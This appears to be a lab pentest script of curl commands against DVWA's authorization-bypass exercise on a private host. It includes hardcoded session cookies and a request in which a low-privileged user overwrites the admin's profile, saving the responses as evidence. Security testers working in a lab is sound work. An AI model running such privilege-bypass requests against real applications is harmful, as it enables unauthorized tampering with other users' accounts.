B='http://10.31.0.87:3000'
ADMIN='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed'
GORD='PHPSESSID=668114fe6ed84d23e36a83697af2ebbf'
mkdir -p evidence/auth

for SRC in low medium high; do
  curl -s -b "$ADMIN; security=low" "$B/vulnerabilities/authbypass/source/$SRC.php" -o /tmp/ab_$SRC -w "$SRC:%{http_code} bytes:%{size_download}\n"
done

# inspect get_user_data.php as admin and as gordonb (AUTHORIZATION BYPASS test)
echo "== as admin"
curl -s -b "$ADMIN; security=low" "$B/vulnerabilities/authbypass/get_user_data.php" | head -c 500; echo
echo "== as gordonb (lower-priv)"
curl -s -b "$GORD; security=low" "$B/vulnerabilities/authbypass/get_user_data.php" | head -c 500 | tee evidence/auth/get_user_data-gordonb.txt; echo
echo "== as no-auth"
curl -s "$B/vulnerabilities/authbypass/get_user_data.php" | head -c 500; echo

# change_user_details.php as gordonb (update admin user id=1)
echo "== gordonb POST change_user_details.php (change admin first_name)"
DATA='{"id":1,"first_name":"PWNED_BY_GORDONB","surname":"x"}'
curl -s -b "$GORD; security=low" -X POST -H 'Content-Type: application/json' -d "$DATA" \
  "$B/vulnerabilities/authbypass/change_user_details.php" | tee evidence/auth/authbypass_write.txt
echo
echo "== admin reads user 1 (verify tampering)"
curl -s -b "$ADMIN; security=low" "$B/vulnerabilities/authbypass/get_user_data.php" | head -c 500
